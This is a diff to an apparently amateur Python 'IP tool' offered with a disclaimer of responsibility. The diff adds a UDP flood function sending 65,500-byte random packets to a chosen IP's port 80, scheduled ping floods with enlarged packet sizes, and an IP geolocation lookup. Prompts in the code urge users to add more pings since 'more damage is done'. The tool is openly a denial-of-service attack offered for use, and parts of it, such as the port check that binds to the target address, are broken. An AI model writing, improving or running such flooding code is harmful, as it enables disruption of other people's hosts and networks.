@@ -4,15 +4,27 @@ I am not responsible for any actions taken by the users of this code!
 
 # code
 ```py
+import threading
+import random
+import sys
+import re
+
 import os
 import ipaddress 
-import threading
 import time
 import asyncio
 import socket
 import json
 
-#https://www.geeksforgeeks.org/reading-and-writing-json-to-a-file-in-python/
+from urllib.request import urlopen
+from bs4 import BeautifulSoup as bs
+from apscheduler.schedulers.background import BackgroundScheduler
+from scapy.all import *
+
+
+
+sched = BackgroundScheduler()
+sched.start()
 
 # System call
 os.system("")
@@ -42,8 +54,6 @@ loading = """
                        ╚══╝"""
 
 
-#create the loop for the ping function
-loop = asyncio.get_event_loop() or asyncio.create_event_loop()
  
 
 #save ips to a json file
@@ -62,13 +72,25 @@ def saveip():
 def loadip():
     with open('ips.json', 'r') as openfile: 
         json_object = json.load(openfile) 
-    print("IPS: \n" + json_object)
+    wait = input("IPS: \n" + json_object)
 
 #create code that gets a area a ip is in
 def locate():
-    print("IN BETA!!")
+    print(f"Enter the IP:")
+    ip = input()
+    try:
+        print (ipaddress.ip_address(ip), "is a active ip address") 
+    except Exception:
+        wait = input("The ip you entered is not a valid ip address.")
+    try:
+        geody = "https://tools.keycdn.com/geo?host=" + ip
+        html_page = urlopen(geody).read()
+        soup = bs(html_page, features="html.parser")
+        data = soup.find("div", {"class": "language-javascript"})
+        print(soup)
+    except Exception as e:
+        print(e)
     ipstart()
-
 
 #gets info on a ip, fix the port, add more info.
 def ipinfo():
@@ -78,25 +100,51 @@ def ipinfo():
         print (ipaddress.ip_address(ip), "is a active ip address") 
     except Exception:
         wait = input("The ip you entered is not a valid ip address.")
+    try:
     #get the open ports of a ip
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.bind((ip, 0))
-    print('listening on port:', sock.getsockname()[1])
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind((ip, 0))
+        print('listening on port:', sock.getsockname()[1])
+    except Exception as e:
+        print(e)
+    wait = input()
 
 
 #dos a ip, want to add a proxy server
-async def ping(ip, size, amount: int):
+def ping(ip, size, amount: int):
     #ping pong, by by router
     try:
         os.system(f'ping -n {amount} -l {size} {ip}')
         ipstart()
-    except Exception as e:
+    except Exception:
         print(f"The code can not ping the ip.")
         ipstart()
+
+def bye(ip, size: int, amount: int):
+    print("Getting ready to attack.")
+    try:
+        port = 80
+        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        data = random._urandom(65500)
+        udp.sendto(data, (ip, port))
+        wait = input()
+    except Exception as e:
+        print(e)
+        wait = input()
+
+
+async def prepare(ip, size, amount: int):
+    for i in range(amount):
+        try:
+            sched.add_job(func=ping, args=(ip, size, amount))
+            sched.add_job(func=bye, args=(ip, size, amount))
+        except Exception as e:
+            print(e)
 
 
 #prepare the attack
 def attack():
+    threads = []
     print(f"Enter the IP:")
     ip = input()
     #checks if the ip is valid or not
@@ -107,12 +155,10 @@ def attack():
         ipstart()
     print("How many pings would you like to do? The more the merrier!(The more you have the longer it takes, but more damage is done, you need more to affect the ip.)")
     amount = int(input())
-    print("What do you want the size of the ping to be?(anything over 1200 bytes will time out a lot of times, sometimes it doesn't, you can't do anything over 6500 bytes. The reccomended size is 1200.)")
+    print("What do you want the size of the ping to be?(anything over 15k bytes will time out a lot of times, sometimes it doesn't, you can't do anything over 65000 bytes. The reccomended size is 15k.)")
     size = int(input())
-    while True:
-        #loops and runs the ping attack
-        tsk = loop.create_task(ping(ip, size, amount))
-        loop.run_until_complete(tsk)
+    asyncio.run(prepare(ip, size, amount))
+
 
 
 #get a website info
@@ -126,9 +172,12 @@ def getweb():
     ipstart()
 
 
+
 #start the code
 def ipstart():
     print(f"""{style.RED}
+
+    
     
 ██╗██████╗
 ██║██╔══██╗
@@ -185,7 +234,6 @@ def ipstart():
 
 
 ipstart()
-
 
 
 ```
